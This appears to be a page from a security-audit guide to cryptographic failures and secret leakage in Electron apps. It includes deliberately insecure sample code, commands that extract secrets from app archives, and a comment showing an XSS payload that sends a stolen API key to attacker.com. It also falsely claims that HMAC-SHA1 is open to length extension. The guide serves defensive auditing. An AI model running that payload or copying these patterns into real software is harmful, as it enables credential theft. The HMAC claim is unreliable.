---
title: Crypto & Secrets Sinks
description: Cryptographic failures, key exposure, and secrets leakage patterns in Electron apps
---

# Crypto & Secrets Sinks

Cryptographic failures in Electron apps often lead to credential theft, session hijacking, and authentication bypass. Unlike traditional RCE sinks, these sinks are dangerous because they're **hard to see** — the vulnerability is often in what the app *doesn't* do (encrypt, validate, rotate) rather than an explicit dangerous call.

---

## Hardcoded Secrets

The most common and highest-signal finding in Electron apps:

```javascript
// API keys:
const API_KEY = 'sk-live-abc123def456...';              // SOURCE (plaintext)
const STRIPE_SECRET = 'sk_live_51Hab...';               // SOURCE (never hardcode live keys)

// OAuth client secrets:
const OAUTH_CLIENT_SECRET = 'abc123xyz-secret-do-not-share';

// Private keys embedded in source:
const PRIVATE_KEY = `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2a2rwplBQLF29amygykEMmYz0+Ixkd6mGGGn5fPjWJ7...
-----END RSA PRIVATE KEY-----`;

// Encryption keys:
const ENCRYPTION_KEY = Buffer.from('0123456789abcdef0123456789abcdef', 'hex');
const IV = Buffer.from('abcdef0123456789', 'hex');  // Static IV → deterministic encryption

// Database credentials:
const DB_PASS = 'SuperSecretProd2023!';
```

### Why Hardcoded Secrets Are Critical in Electron

In server-side apps, source code isn't exposed to users. In Electron:

1. `app.asar` is extractable by anyone with the binary
2. Minification is **not** obfuscation — strings remain in plaintext
3. Native module symbols can be read with `strings` or `nm`
4. All JS in the renderer is viewable via DevTools if not disabled

```bash
# Extract secrets from any Electron app in 3 commands:
asar extract app.asar app_source/
grep -r "key\|secret\|password\|token\|api_" app_source/ -i | \
  grep -v "node_modules" | grep "=\s*['\"]"
```

---

## Weak Cryptography

### Using Deprecated or Weak Algorithms

```javascript
const crypto = require('crypto');

// MD5 — broken, collision attacks:
const hash = crypto.createHash('md5').update(password).digest('hex');

// SHA1 — deprecated for security, broken for collision resistance:
const sig = crypto.createHash('sha1').update(data).digest('hex');

// DES / 3DES — too short key, deprecated:
const cipher = crypto.createCipheriv('des-cbc', key, iv);

// RC4 — stream cipher, broken:
const cipher = crypto.createCipheriv('rc4', key, '');

// ECB mode — deterministic, leaks patterns:
const cipher = crypto.createCipheriv('aes-256-ecb', key, '');
```

### Weak Key Derivation

```javascript
// No KDF — raw password as key:
const key = password.padEnd(32, '0');  // WEAK: no stretching
const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

// PBKDF2 with insufficient iterations:
crypto.pbkdf2(password, salt, 1000, 32, 'sha256', ...);
// 1000 iterations is too few — OWASP recommends 600,000+ for SHA-256

// Static salt:
const SALT = 'hardcoded_salt_value';
crypto.pbkdf2(password, SALT, 100000, 32, 'sha256', ...);
// Static salt defeats salt's purpose — enables precomputation
```

### Static IV / Nonce

```javascript
// AES-CBC with static IV — deterministic encryption:
const IV = Buffer.alloc(16, 0);  // All zeros — NEVER do this
const cipher = crypto.createCipheriv('aes-256-cbc', key, IV);

// AES-GCM nonce reuse — catastrophic, allows key recovery:
const NONCE = crypto.randomBytes(12);  // Generated once at startup
setInterval(() => {
  const cipher = crypto.createCipheriv('aes-256-gcm', key, NONCE);  // Same nonce!
  // Each reuse leaks keystream XOR
}, 1000);
```

---

## Credential Storage in Plaintext

### LocalStorage / sessionStorage

```javascript
// Renderer-side (visible in DevTools → Application → Local Storage):
localStorage.setItem('authToken', token);          // SINK: plaintext in app data
localStorage.setItem('password', hashedPassword);  // SINK: recoverable
sessionStorage.setItem('apiKey', key);             // SINK: visible in DevTools
```

### Electron's safeStorage API (correct approach vs anti-patterns)

```javascript
// CORRECT — encrypted at rest using OS keychain:
const { safeStorage } = require('electron');
const encrypted = safeStorage.encryptString(apiToken);
fs.writeFileSync(tokenPath, encrypted);

// WRONG — rolling your own, often incorrectly:
const obfuscated = Buffer.from(token).toString('base64');  // Not encryption
fs.writeFileSync(tokenPath, obfuscated);

// WRONG — writing plaintext to userData:
const userDataPath = app.getPath('userData');
fs.writeFileSync(path.join(userDataPath, 'credentials.json'), 
  JSON.stringify({ token, password }));  // SINK: plaintext file

// WRONG — using keytar incorrectly (missing error handling leaks):
keytar.getPassword('MyApp', 'user').then(password => {
  global.cachedPassword = password;  // SINK: plaintext in global
  res.send(password);                // SINK: reflected over IPC to renderer
});
```

---

## TLS/SSL Failures

### Certificate Validation Disabled

```javascript
// Disabling cert validation — common in "dev mode" that ships to prod:
app.on('certificate-error', (event, webContents, url, error, certificate, callback) => {
  event.preventDefault();
  callback(true);  // Accept all certs — MitM trivially possible
});

// Node.js-level:
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';  // SINK: accept all certs

// In https module:
const options = {
  rejectUnauthorized: false,  // SINK: no cert validation
};
https.request(options, ...);
```

### HTTP Instead of HTTPS

```javascript
// Fetching over plaintext HTTP:
fetch('http://api.myapp.com/user/token')  // SINK: MitM → token theft
  .then(r => r.json())
  .then(({ token }) => authenticate(token));

// Electron-updater update server over HTTP:
// electron-builder.yml:
// publish:
//   url: http://updates.myapp.com/  ← SINK: MitM → update poisoning → RCE
```

---

## IPC Credential Exposure

Credentials traveling over IPC are exposed to the renderer process:

```javascript
// main.js — credential exposure over IPC:
ipcMain.handle('get-api-key', async (event) => {
  return process.env.STRIPE_SECRET_KEY;  // SINK: secret exposed to renderer world
});

// preload.js — renderer can now read:
contextBridge.exposeInMainWorld('app', {
  getApiKey: () => ipcRenderer.invoke('get-api-key')
  // Now any XSS payload can steal the API key:
  // fetch('https://attacker.com/?k=' + await window.app.getApiKey())
});
```

### Session Token Leakage via IPC Logging

```javascript
// Logging all IPC events (common debugging pattern):
ipcMain.on('*', (event, channel, ...args) => {
  console.log('IPC:', channel, JSON.stringify(args));  // SINK: logs may include tokens
  // If logs are sent to remote telemetry → credential exfiltration
});
```

---

## Crypto Misuse in Protocol Implementations

Custom protocol handlers often roll their own crypto:

```javascript
// Homebrew signing verification:
ipcMain.handle('verify-update', async (event, updatePath, signature) => {
  const fileHash = crypto.createHash('sha256')
    .update(fs.readFileSync(updatePath))
    .digest('hex');
  
  // Wrong: comparing the hash to itself, not to a signed value:
  if (fileHash === signature) {  // SINK: attacker provides matching hash+file
    runUpdate(updatePath);
  }
  
  // Correct: RSA-PSS signature verification against embedded public key
});

// Length extension attack via HMAC-SHA1:
const mac = crypto.createHmac('sha1', secret).update(data).digest('hex');
// SHA1 HMAC is vulnerable to length extension — upgrade to SHA-256
```

---

## Finding Crypto & Secret Sinks

```bash
# Find hardcoded secrets:
grep -rn "api_key\|apiKey\|API_KEY\|secret\|SECRET\|password\|PASSWORD\|token\|TOKEN" \
  --include="*.js" . | grep -v "node_modules\|//\|\.test\." | \
  grep "=\s*['\"][A-Za-z0-9+/=_-]\{16,\}" | head -30

# Find weak crypto:
grep -rn "createHash\|createCipher\|pbkdf2\|createHmac" \
  --include="*.js" . | grep -v node_modules | \
  grep -iE "md5|sha1|des|rc4|ecb" | head -20

# Find cert validation disabled:
grep -rn "rejectUnauthorized\s*:\s*false\|NODE_TLS_REJECT\|certificate-error" \
  --include="*.js" . | grep -v node_modules

# Find plaintext credential storage:
grep -rn "localStorage\.setItem\|writeFileSync.*token\|writeFileSync.*password\|writeFileSync.*secret" \
  --include="*.js" . | grep -v node_modules

# Find HTTP update URLs:
grep -rn "http://" --include="*.yml" --include="*.json" . | \
  grep -i "publish\|update\|release" | grep -v node_modules

# Find safeStorage bypasses:
grep -rn "credentials\|password\|token\|secret" --include="*.js" . | \
  grep "writeFile\|setItem\|global\." | grep -v "safeStorage\|encrypt" | \
  grep -v node_modules | head -20
```

---

## Risk Matrix

| Pattern | Risk | Impact |
|---------|------|--------|
| Hardcoded live API key | Critical | Immediate service abuse |
| Private key in ASAR | Critical | Key impersonation |
| `rejectUnauthorized: false` | Critical | MitM → credential theft |
| AES-GCM nonce reuse | Critical | Key recovery |
| Plaintext token in userData | High | Local privilege → token theft |
| Static IV | High | Ciphertext patterns leak |
| PBKDF2 < 10k iterations | Medium | Offline password cracking |
| MD5 for integrity | Medium | Collision attack |
| Token over IPC | Medium | XSS → token exfiltration |
| `NODE_TLS_REJECT_UNAUTHORIZED=0` | High | Ships MitM vulnerability |
